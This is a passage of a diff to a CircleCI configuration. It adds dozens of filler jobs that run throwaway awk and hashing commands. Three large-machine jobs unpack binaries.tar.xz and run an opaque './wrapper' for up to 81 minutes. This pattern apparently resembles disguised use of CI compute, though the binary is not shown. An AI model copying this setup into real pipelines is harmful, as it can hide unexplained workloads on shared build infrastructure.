+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/manifest && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  warmup_canary-v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: early supper
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo 'x,y,z,w' | awk -F, '{print $3}'; true ; } > /tmp/outbox/phase-ready.out
+            stat -c '%s %n' /tmp/outbox/phase-ready.out
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - phase-ready.out
+  canary-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/phase-ready.out && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+  canary1_BUILD_STG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: rock pool
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{if($1%2){o=o" "$1} else {e=e" "$1}}END{print o; print e}' | wc -l; true ; } > /tmp/outbox/final.txt
+            stat -c '%s %n' /tmp/outbox/final.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - final.txt
+  BUILD_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Grab gate output
+          command: |
+            test -s /tmp/outbox/final.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar xJf binaries.tar.xz
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./wrapper"
+
+  validate_vega-rc_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: calf raise
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && echo hi > "$tf" && stat -c %s "$tf" 2>/dev/null && rm "$tf"; true ; } > /tmp/outbox/stage-done.sig
+            stat -c '%s %n' /tmp/outbox/stage-done.sig
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stage-done.sig
+  precheck_lets-go_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: trough
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM * 2)) $((RANDOM / 2)) $((RANDOM ^ 42)) | md5sum; true ; } > /tmp/outbox/58.blob
+            stat -c '%s %n' /tmp/outbox/58.blob
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 58.blob
+  g2_produce-production-artifact-bundle_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: whoosh
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "red\nblue\ngreen\nblue\nred\n" | awk '!seen[$0]++'; true ; } > /tmp/outbox/big_job_output.out
+            stat -c '%s %n' /tmp/outbox/big_job_output.out
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - big_job_output.out
+  postbuild_dp-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: leg raise
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1;b=1;for(i=0;i<30;i++){c=a+b;a=b;b=c}print c}'; true ; } > /tmp/outbox/bundle
+            stat -c '%s %n' /tmp/outbox/bundle
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - bundle
+  ctx_fix-retry_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: chime
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; print substr(s,2,3)}'; true ; } > /tmp/outbox/manifest
+            stat -c '%s %n' /tmp/outbox/manifest
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - manifest
+  gamma_lima_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: in irons
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 171050 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/outbox/handover.state
+            stat -c '%s %n' /tmp/outbox/handover.state
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - handover.state
+  A_bug-5695_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: muscle up
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<177743;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/outbox/2023-09-04.data
+            stat -c '%s %n' /tmp/outbox/2023-09-04.data
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2023-09-04.data
+  spinner_LaunchProd_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: leg curl
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 58720256 | fold -w16 | sort -u | wc -l; true ; } > /tmp/outbox/trace.gz
+            stat -c '%s %n' /tmp/outbox/trace.gz
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - trace.gz
+  Beta_java17-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: 3am noodle
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1 count=64 2>/dev/null | od -An -tx1 | tr -d ' \n'; true ; } > /tmp/outbox/step-26.txt
+            stat -c '%s %n' /tmp/outbox/step-26.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-26.txt
+  gamma_PROD_BUILD_1_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: squat light
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 76452); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/outbox/main_job_output_v4.log
+            stat -c '%s %n' /tmp/outbox/main_job_output_v4.log
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - main_job_output_v4.log
+  C_min-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: grid north
+          command: |
+            mkdir -p /tmp/outbox
+            set +o pipefail 2>/dev/null; seq 1 737039 | md5sum > /tmp/outbox/report.out; true
+            stat -c '%s %n' /tmp/outbox/report.out
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - report.out
+  p2_europa-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: retrograde
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo -e "a\nb\nc\nd" | sort -r | md5sum; true ; } > /tmp/outbox/bundle.pkg
+            stat -c '%s %n' /tmp/outbox/bundle.pkg
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - bundle.pkg
+  route_add-queue-redirect_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: assisted squat
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "a;b;c;d" | awk -F';' '{if(NF==4)print "four"}'; true ; } > /tmp/outbox/summary.log
+            stat -c '%s %n' /tmp/outbox/summary.log
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - summary.log
+  canary1_nightly-v8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: not yet
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world"; gsub("l","L",s); print s}'; true ; } > /tmp/outbox/gate-ready.log
+            stat -c '%s %n' /tmp/outbox/gate-ready.log
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-ready.log
+  hook_v4-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pot hanger
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; find / -maxdepth 2 -name "bin" 2>/dev/null | head -5; true ; } > /tmp/outbox/output.txt
+            stat -c '%s %n' /tmp/outbox/output.txt
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - output.txt
+workflows:
+  build-and-test:
+    jobs:
+      - hydrate_Prepare_App9
+      - Prepare_App9:
+          requires:
+            - hydrate_Prepare_App9
+      - g2_deploy:
+          requires:
+            - hydrate_Prepare_App9
+      - deploy:
+          requires:
+            - g2_deploy
+      - produce_vega-rc
+      - validate_vega-rc_2:
+          requires:
+            - produce_vega-rc
+      - vega-rc:
+          requires:
+            - validate_vega-rc_2
+      - B_lets-go:
+          requires:
+            - validate_vega-rc_2
+      - precheck_lets-go_2:
+          requires:
+            - B_lets-go
+      - lets-go:
+          requires:
+            - precheck_lets-go_2
+      - prefetch_produce-production-artifact-bundle:
+          requires:
+            - precheck_lets-go_2
+      - g2_produce-production-artifact-bundle_2:
+          requires:
+            - prefetch_produce-production-artifact-bundle
+      - produce-production-artifact-bundle:
+          requires:
+            - g2_produce-production-artifact-bundle_2
+      - Gamma_dp-3:
+          requires:
+            - g2_produce-production-artifact-bundle_2
+      - postbuild_dp-3_2:
+          requires:
+            - Gamma_dp-3
+      - dp-3:
+          requires:
+            - postbuild_dp-3_2
+      - deps_fix-retry:
+          requires:
+            - postbuild_dp-3_2
+      - ctx_fix-retry_2:
+          requires:
+            - deps_fix-retry
+      - fix-retry:
+          requires:
+            - ctx_fix-retry_2
+      - hydrate_lima:
+          requires:
+            - ctx_fix-retry_2
+      - gamma_lima_2:
+          requires:
+            - hydrate_lima
+      - lima:
+          requires:
+            - gamma_lima_2
+      - fetcher_bug-5695:
+          requires:
+            - gamma_lima_2
+      - A_bug-5695_2:
+          requires:
+            - fetcher_bug-5695
+      - bug-5695:
+          requires:
+            - A_bug-5695_2
+      - validate_rm-cache-bug
+      - cacher_dotnet8-vet
+      - rm-cache-bug:
+          requires:
+            - validate_rm-cache-bug
+            - cacher_dotnet8-vet
+      - dotnet8-vet:
+          requires:
+            - validate_rm-cache-bug
+            - cacher_dotnet8-vet
+      - rigel-final:
+          requires:
+            - validate_rm-cache-bug
+            - cacher_dotnet8-vet
+      - update-login-crash:
+          requires:
+            - validate_rm-cache-bug
+            - cacher_dotnet8-vet
+      - verify:
+          requires:
+            - validate_rm-cache-bug
+            - cacher_dotnet8-vet
+      - RUN_UAT:
+          requires:
+            - validate_rm-cache-bug
+            - cacher_dotnet8-vet
+      - brodcast-86:
+          requires:
+            - validate_rm-cache-bug
+            - cacher_dotnet8-vet
+      - round2_intergration
+      - intergration:
+          requires:
+            - round2_intergration
+      - canary1_BUILD_STG:
+          requires:
+            - round2_intergration
+      - BUILD_STG:
+          requires:
+            - canary1_BUILD_STG
+      - B_add-router-glitch:
+          requires:
+            - canary1_BUILD_STG
+      - add-router-glitch:
+          requires:
+            - B_add-router-glitch
+      - warmup_canary-v7:
+          requires:
+            - B_add-router-glitch
+      - canary-v7:
+          requires:
+            - warmup_canary-v7
+      - go_rl-2a:
+          requires:
+            - warmup_canary-v7
+      - rl-2a:
+          requires:
+            - go_rl-2a
+      - gamma_chore-1248:
+          requires:
+            - go_rl-2a
+      - chore-1248:
+          requires:
+            - gamma_chore-1248
+      - Alpha_LaunchProd
+      - spinner_LaunchProd_2:
+          requires:
+            - Alpha_LaunchProd
+      - LaunchProd:
+          requires:
+            - spinner_LaunchProd_2
+      - p1_java17-ship:
+          requires:
+            - spinner_LaunchProd_2
+      - Beta_java17-ship_2:
+          requires:
+            - p1_java17-ship
+      - java17-ship:
+          requires:
+            - Beta_java17-ship_2
+      - ctx_PROD_BUILD_1:
+          requires:
+            - Beta_java17-ship_2
+      - gamma_PROD_BUILD_1_2:
+          requires:
+            - ctx_PROD_BUILD_1
+      - PROD_BUILD_1:
+          requires:
+            - gamma_PROD_BUILD_1_2
+      - route_min-test:
+          requires:
+            - gamma_PROD_BUILD_1_2
+      - C_min-test_2:
+          requires:
+            - route_min-test
+      - min-test:
+          requires:
+            - C_min-test_2
+      - fixture_europa-v2:
+          requires:
+            - C_min-test_2
+      - p2_europa-v2_2:
+          requires:
+            - fixture_europa-v2
+      - europa-v2:
+          requires:
+            - p2_europa-v2_2
+      - cook_add-queue-redirect
+      - route_add-queue-redirect_2:
+          requires:
+            - cook_add-queue-redirect
+      - add-queue-redirect:
+          requires:
+            - route_add-queue-redirect_2
+      - fixture_nightly-v8:
+          requires:
+            - route_add-queue-redirect_2
+      - canary1_nightly-v8_2:
+          requires:
+            - fixture_nightly-v8
+      - nightly-v8:
+          requires:
+            - canary1_nightly-v8_2
+      - step1_v4-canary:
+          requires:
+            - canary1_nightly-v8_2
+      - hook_v4-canary_2:
+          requires:
+            - step1_v4-canary
+      - v4-canary:
+          requires:
+            - hook_v4-canary_2
